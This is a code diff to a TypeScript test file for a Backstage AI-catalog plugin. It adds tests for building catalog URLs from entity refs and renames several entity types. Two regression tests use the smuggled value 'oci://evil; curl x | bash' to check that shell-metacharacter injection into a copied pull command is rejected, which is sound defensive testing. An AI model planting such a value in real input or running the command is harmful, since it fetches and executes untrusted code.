@@ -17,7 +17,11 @@
 import type { Entity } from '@backstage/catalog-model';
 
 import type { FilterDefinition } from '../blueprints/AiCatalogFilterBlueprint';
-import { applyEntityFilters, getAdoptionAction } from './entityHelpers';
+import {
+  applyEntityFilters,
+  entityRefHref,
+  getAdoptionAction,
+} from './entityHelpers';
 
 function entity(overrides: {
   name?: string;
@@ -44,6 +48,30 @@ function entity(overrides: {
   } as Entity;
 }
 
+describe('entityRefHref', () => {
+  it('builds a group catalog URL from a bare owner name', () => {
+    expect(entityRefHref('team-ai-platform')).toBe(
+      '/catalog/default/group/team-ai-platform',
+    );
+  });
+
+  it('parses a fully-qualified group ref', () => {
+    expect(entityRefHref('group:other-ns/platform')).toBe(
+      '/catalog/other-ns/group/platform',
+    );
+  });
+
+  it('parses a fully-qualified user ref', () => {
+    expect(entityRefHref('user:default/jdoe')).toBe(
+      '/catalog/default/user/jdoe',
+    );
+  });
+
+  it('returns undefined for an unparseable ref', () => {
+    expect(entityRefHref('group:')).toBeUndefined();
+  });
+});
+
 describe('getAdoptionAction', () => {
   it('returns npx copy command for skill entities', () => {
     const action = getAdoptionAction(
@@ -55,7 +83,7 @@ describe('getAdoptionAction', () => {
   it('returns podman pull command for the first oci:// remote', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         remotes: [
           { url: 'https://not-oci.example.com', type: 'other' },
           { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
@@ -71,7 +99,7 @@ describe('getAdoptionAction', () => {
   it('falls through to git-sourced action when the ai-asset-source annotation is oci but no oci:// remote exists (finding #1 regression)', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         annotations: { 'rhdh.io/ai-asset-source': 'oci' },
         location: {
           type: 'git',
@@ -229,7 +257,7 @@ describe('getAdoptionAction', () => {
   it('rejects an oci:// remote containing shell metacharacters (clipboard injection regression)', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         remotes: [{ url: 'oci://evil; curl x | bash', type: 'oci' }],
       }),
     );
@@ -239,7 +267,7 @@ describe('getAdoptionAction', () => {
   it('skips an unsafe oci:// remote and resolves the next valid one', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         remotes: [
           { url: 'oci://evil; curl x | bash', type: 'oci' },
           { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
@@ -255,7 +283,7 @@ describe('getAdoptionAction', () => {
   it('accepts an oci:// reference with a registry port and tag', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         remotes: [
           {
             url: 'oci://registry.example.com:5000/models/foo:latest',
@@ -324,14 +352,14 @@ const skill: Entity = {
 
 const agent: Entity = {
   apiVersion: 'backstage.io/v1alpha1',
-  kind: 'Component',
+  kind: 'AiResource',
   metadata: {
     name: 'dev-assistant',
     namespace: 'default',
     description: 'AI developer assistant',
     tags: ['agent'],
   },
-  spec: { type: 'ai-agent', lifecycle: 'experimental', owner: 'team-ml' },
+  spec: { type: 'agent', lifecycle: 'experimental', owner: 'team-ml' },
 };
 
 const entities = [skill, agent];
